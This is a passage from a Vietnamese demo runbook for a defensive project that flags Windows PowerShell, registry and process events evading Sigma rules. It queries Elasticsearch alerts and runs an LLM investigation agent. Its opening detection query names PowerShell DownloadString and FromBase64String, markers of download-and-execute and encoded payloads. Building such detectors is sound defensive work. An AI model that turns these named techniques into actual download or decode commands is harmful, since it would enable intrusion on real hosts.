  --query-string 'winlog.event_data.ScriptBlockText:*RED_DEMO_PS* OR winlog.event_data.ScriptBlockText:*DownloadString* OR winlog.event_data.ScriptBlockText:*FromBase64String*'
```

Kiểm tra alert:

```bash
curl -s -u elastic:PASSWORD \
  "http://10.10.20.100:9200/red-alerts-powershell-demo/_search?size=10&sort=@timestamp:desc" \
  | jq '.hits.hits[]._source | {ts: ."@timestamp", score: ."red.detection_score", top_rule: ."red.top_rule", text: ."red.command_line"}'
```

### 6.3 Registry Event

Backfill Sysmon SetValue Event ID 13 bằng `config/registry_event.yaml`:

```bash
python3 scripts/detect_live.py \
  --config config/registry_event.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-registry-demo \
  --event-id 13 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 100 \
  --query-string 'winlog.event_data.TargetObject:*RED_Demo* OR winlog.event_data.TargetObject:*red_demo*'
```

Nếu muốn bắt thêm registry key create/delete, chạy lại với `--event-id 12`
hoặc `--event-id 14` tùy Sysmon config. Kịch bản registry chính dùng Event ID
13 vì hành vi trọng tâm là set value.

Kiểm tra alert:

```bash
curl -s -u elastic:PASSWORD \
  "http://10.10.20.100:9200/red-alerts-registry-demo/_search?size=10&sort=@timestamp:desc" \
  | jq '.hits.hits[]._source | {ts: ."@timestamp", score: ."red.detection_score", top_rule: ."red.top_rule", target: ."red.command_line"}'
```

Thông điệp chính: mỗi event type phải dùng đúng config và đúng field log. RED có
thể demo cùng một ý tưởng "rule evasion" trên process command line,
ScriptBlockText và registry target/value events.

## 7. AI Agent investigation

Sau khi `red-alerts` đã có alert PowerShell, chạy AI Agent một lần:

```bash
source ~/venvs/rule_evasion_env/bin/activate
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
source .env

python3 -m agent.daemon \
  --interval 5 \
  --score-threshold 0.5 \
  --max-iter 1 \
  --batch-limit 1 \
  --since "2026-05-15T08:05:40Z" \
  --query-string 'red.command_line:*powershell*' \
  --no-state
```

Chạy này gọi LLM thật và tốn token. Mức thường gặp trong demo:

```text
~60-120 giây
~30k-80k tokens
~$0.01-$0.03 nếu dùng DeepSeek
```

Kiểm tra investigation mới nhất:

```bash
curl -s -u elastic:PASSWORD \
  "http://10.10.20.100:9200/ai-investigations/_search?size=1&sort=timestamp:desc" \
  | jq '.hits.hits[0]._source | {id: .investigation_id, severity: .triage.severity, technique: .red_analyst.evasion_technique, title: .report.title_vi, cost: .estimated_cost_usd, tokens: .total_tokens}'
```

Nơi xem trên Kibana:

```text
Discover -> AI Investigations
```

Nếu chưa có data view:

```text
Name: AI Investigations
Index pattern: ai-investigations
Timestamp field: timestamp
```

Field nên pin trong Discover:

```text
timestamp
triage.severity
triage.confidence
red_analyst.evasion_technique
mitre.primary_technique
response.requires_human_approval
estimated_cost_usd
total_tokens
report.title_vi
report.summary_vi
```

## 8. Terminal monitor

Monitor dùng `.env` để đọc Elasticsearch credential.

```bash
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
./demo/monitor.sh 10
```

Màn hình hiển thị:

- Tổng số document trong `red-alerts` và `ai-investigations`.
- 5 RED alert mới nhất.
- 5 AI investigation mới nhất.

## 9. Checklist trình diễn

1. Mở Kibana `Security -> Rules`, filter `SIGMA -`, cho thấy baseline rules.
2. Chọn event type muốn demo: process creation, PowerShell ScriptBlock hoặc registry event.
3. Chạy `baseline` trên Windows, chờ Elastic Security alert.
4. Chạy `evasion`, giải thích vì sao exact-match baseline có thể bỏ sót biến thể.
5. Chạy RED backfill bằng `detect_live.py` với config tương ứng, mở `red-alerts`.
6. Chỉ ra `red.detection_score`, `red.top_rule`, `red.command_line`.
7. Chạy `agent.daemon --max-iter 1`, mở `ai-investigations`.
8. Kết luận bằng báo cáo tiếng Việt, MITRE mapping, evasion explanation và Sigma patch.

## 10. Troubleshooting

| Lỗi | Cách xử lý |
|---|---|
| `ModuleNotFoundError: numpy` hoặc `openai` | `source ~/venvs/rule_evasion_env/bin/activate` rồi `pip install -r requirements.txt` |
| `ES_PASSWORD is empty` khi chạy monitor | Điền `ES_PASSWORD` trong `.env` |
| Không thấy RED alert | Kiểm tra `--es-index`, `--timestamp-field`, khoảng `--since/--until`, và đúng Event ID: `1` process, `4104` PowerShell, `13` registry SetValue |
| Không thấy PowerShell ScriptBlock log | Bật Script Block Logging và kiểm tra channel `Microsoft-Windows-PowerShell/Operational` có Event ID `4104` |
| Không thấy registry log | Kiểm tra Sysmon config có collect registry set value Event ID `13` |
| Không thấy Security alert baseline | Detection Rules chạy theo lịch; chờ ít nhất một interval hoặc kiểm tra rule đã enable |
| AI Agent không chạy | Kiểm tra `DEEPSEEK_API_KEY`, `ES_HOST`, `ES_USER`, `ES_PASSWORD` trong `.env` |
| Query quá nhiễu | Thêm `--query-string 'winlog.event_data.CommandLine:*powershell* OR process.command_line:*powershell*'` |
